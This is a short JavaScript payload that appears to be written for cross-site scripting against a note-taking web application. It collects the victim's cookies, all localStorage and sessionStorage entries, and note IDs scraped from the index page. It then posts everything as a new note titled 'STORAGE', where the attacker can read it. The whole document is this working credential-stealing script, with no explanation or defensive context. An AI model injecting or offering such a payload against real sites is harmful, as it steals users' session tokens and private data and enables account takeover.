var cookie = document.cookie || 'NONE';
var loc = location.href;
var local = '';
var session = '';

try {
  for(var i=0; i<localStorage.length; i++) {
    var k = localStorage.key(i);
    local += k + '=' + localStorage.getItem(k) + ';';
  }
} catch(e) { local = 'ERROR:' + e; }

try {
  for(var i=0; i<sessionStorage.length; i++) {
    var k = sessionStorage.key(i);
    session += k + '=' + sessionStorage.getItem(k) + ';';
  }
} catch(e) { session = 'ERROR:' + e; }

fetch('/').then(function(r){ return r.text(); }).then(function(h){
  var notes = h.match(/\/note\/[a-f0-9]+/g) || [];
  var unique = [];
  notes.forEach(function(n){ if(unique.indexOf(n)===-1) unique.push(n); });
  
  var result = 'LOCAL:' + (local||'EMPTY') + '|SESSION:' + (session||'EMPTY') + '|COOKIE:' + cookie + '|NOTES:' + unique.join(',');
  
  fetch('/note/new', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'title=STORAGE&body=' + encodeURIComponent(result)
  });
});
